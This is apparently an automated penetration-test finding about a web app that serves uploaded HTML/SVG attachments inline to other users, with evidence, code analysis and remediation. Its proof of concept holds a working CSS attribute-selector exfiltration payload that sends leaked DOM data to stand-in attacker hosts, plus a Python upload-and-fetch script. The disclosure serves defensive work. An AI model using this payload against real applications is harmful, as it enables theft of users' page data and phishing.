# Stored XSS / Active Content via Attachment Upload (inline content-disposition, cross-user readable)

**ID:** vuln-0027
**Severity:** LOW
**Found:** 2026-08-18 06:45:13 UTC
**Target:** http://host.docker.internal:3000/
**Endpoint:** /api/v2/ontologies/attachments/:rid/content
**Method:** GET
**CWE:** CWE-79
**CVSS:** 3.5
**Fix Effort:** Low

## Description

The v2 attachment upload endpoint accepts user-supplied files with arbitrary filenames and MIME types, stores them verbatim, and the content endpoint serves them back with `Content-Disposition: inline` and the stored `Content-Type`. An authenticated low-privilege user can upload `text/html` or `image/svg+xml` content that any other authenticated user's browser renders in-line when fetched. Cross-user read succeeds (viewer's attachment is served to an admin), and although CSP blocks inline JavaScript, active content is still rendered, enabling phishing UI and CSS-based exfiltration of DOM data.

## Evidence

Browser fetch of the uploaded HTML attachment as a *different* user (admin) renders the DOM (`documentElement.outerHTML` shows parsed HTML), a `<style>`-based exfil rule issued cross-origin requests `GET https://strixcss.example/x?p=s` and `?p=a`, and the response headers confirm inline serving:

```http
HTTP/1.1 200 OK
Content-Security-Policy: default-src 'self'; ... ;script-src 'self';script-src-attr 'none';style-src 'self' https: 'unsafe-inline'; ...
X-Content-Type-Options: nosniff
Content-Type: text/html
Content-Disposition: inline; filename="t.html"
```

Cross-user read (viewer's attachment read by admin): `200` returning the upload body; anonymous (no auth) is `401`.

## Impact

Any authenticated low-privilege user can store renderer-active content (HTML/SVG) that is served inline to other authenticated users who know or can guess the attachment rid, enabling phishing UI, cross-origin CSS-based exfiltration of in-page sensitive data, and external-resource tracking of victims — despite CSP blocking inline JavaScript.

## Technical Analysis

`POST /api/v2/ontologies/attachments/upload?filename=...` (raw bytes) stores the uploaded file in object storage and records the client-supplied `filename` and a `Content-Type` (either the request's declared `Content-Type` or extension sniff via `mediaTypeForFilename`). There is **no allowlist** restricting which media types may be stored, so `text/html`, `image/svg+xml`, etc. are accepted.

`GET /api/v2/ontologies/attachments/:rid/content` (`src/routes/v2/attachmentsV2.ts`) then does:

```typescript title=src/routes/v2/attachmentsV2.ts startLineNumber=80 endLineNumber=85
res.setHeader("Content-Type", result.row.media_type);
res.setHeader("Content-Length", result.row.size_bytes);
res.setHeader(
  "Content-Disposition",
  `inline; filename="${encodeURIComponent(result.row.filename)}"`,
);
```

Serving `text/html` / `image/svg+xml` with `inline` disposition renders the bytes as active content in the fetching user's browser. Because there is no per-user authorization check on `getAttachmentContent`, any authenticated principal who learns the (unpredictable) attachment rid can fetch another user's attachment. The rid is the only "authorization" (a capability-by-secrecy pattern), which is a defense-in-depth weakness.

CSP is `default-src 'self'; script-src 'self'; script-src-attr 'none'`, so inline `<script>` / event handlers are blocked (verified: `onerror=alert(1337)` did not fire). However:
- `style-src 'self' https: 'unsafe-inline'` permits inline `<style>`, and the browser fetches the declaration URLs cross-origin → **CSS-based exfiltration of DOM data** (attribute selectors) was demonstrated: a `<div data-secret="...">` and `<input value="...">` leaked their starting characters to attacker-controlled URLs via `background:url(...)`.
- `form-action 'self'` blocks external form POSTs, but `text/html` still renders arbitrary UI (phishing overlays, navigatable via SVG `<a>`).
- SVG `<image href="https://...">` loads external resources → tracking/active rendering.

Verified live: viewer uploads `text/html` attachment; admin fetches `/api/v2/ontologies/attachments/<rid>/content` and receives `200`, `Content-Type: text/html`, `Content-Disposition: inline; filename="t.html"`; the HTML is parsed into the DOM (screenshot + outerHTML confirmed rendering, and a `<style>`-based exfil request was issued cross-origin).

## Proof of Concept

1. Authenticate as a low-privilege user (viewer).
2. Upload an HTML file: `POST /api/v2/ontologies/attachments/upload?filename=t.html` with body `<html><body>...active content...</body></html>` and header `Content-Type: text/html`. Response gives `rid`.
3. Authenticate as a different user (admin) and fetch `GET /api/v2/ontologies/attachments/<rid>/content`.
4. Observe `Content-Type: text/html` + `Content-Disposition: inline` and the content rendered in-line in the browser (DOM shows the HTML parsed).
5. To show active exfil without JS: embed `<style>div[data-secret^="s"]{background:url(https://attacker/x?p=s)}</style><div data-secret="secret-token">x</div>`; the victim's browser issues the cross-origin request carrying the leaked prefix.

```python
import requests

BASE = "http://host.docker.internal:3000"
VIEWER = "<viewer-jwt>"
ADMIN = "<admin-jwt>"

# 1) viewer uploads active HTML
r = requests.post(
    f"{BASE}/api/v2/ontologies/attachments/upload?filename=t.html",
    headers={"Authorization": f"Bearer {VIEWER}", "Content-Type": "text/html"},
    data=b'<html><body><style>div[data-secret^="s"]{background:url("https://attacker/x?p=s")}</style><div data-secret="secret-token-123">x</div></body></html>',
)
rid = r.json()["rid"]

# 2) another user (admin) fetches it — rendered cross-user
get = requests.get(f"{BASE}/api/v2/ontologies/attachments/{rid}/content",
                   headers={"Authorization": f"Bearer {ADMIN}"})
print(get.headers.get("Content-Type"))            # text/html
print(get.headers.get("Content-Disposition"))     # inline; filename="t.html"
# -> browser renders it inline; the <style> triggers a cross-origin fetch
#    carrying the leaked DOM prefix to https://attacker/x?p=s
```

## Remediation

1. Enforce an allowlist of safe media types on upload (e.g., images minus SVG, plain text, PDF) and reject or normalize `text/html`, `image/svg+xml`, `application/xhtml+xml`, and any `text/*` that is not plain text.
2. Serve attachments with `Content-Disposition: attachment` (force download) and always a safe, computed `Content-Type` (never trust the client-declared type); add `X-Content-Type-Options: nosniff` (already present) plus a restrictive per-response CSP such as `sandbox` / `default-src 'none'` for active types that must be previewed.
3. Add per-user/tenant authorization on `getAttachmentContent` rather than relying on rid secrecy.

## Assumptions

Requires an authenticated victim user who can be induced to open the inline attachment URL; the attachment rid is an unpredictable UUID, so a separate step (sharing/luring) is needed to deliver the content link.
